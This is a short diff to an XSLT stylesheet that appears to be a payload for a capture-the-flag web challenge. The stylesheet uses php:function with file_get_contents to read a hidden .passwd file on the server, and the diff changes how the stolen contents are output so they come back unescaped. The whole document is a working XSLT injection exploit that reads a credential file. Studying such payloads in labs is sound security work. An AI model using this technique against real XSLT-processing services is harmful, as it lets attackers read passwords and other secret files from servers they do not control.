@@ -5,11 +5,9 @@
     <!-- Store the content of the file in a variable -->
     <xsl:variable name="fileContent" select="php:function('file_get_contents', '/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')" />
     
-    <!-- Output the content of the file with CDATA -->
+    <!-- Output the content of the file -->
     <fileContent>
-      <xsl:text disable-output-escaping="yes"><![CDATA[</xsl:text>
-      <xsl:value-of select="$fileContent" />
-      <xsl:text disable-output-escaping="yes">]]></xsl:text>
+      <xsl:value-of select="$fileContent" disable-output-escaping="yes" />
     </fileContent>
   </xsl:template>
 </xsl:stylesheet>
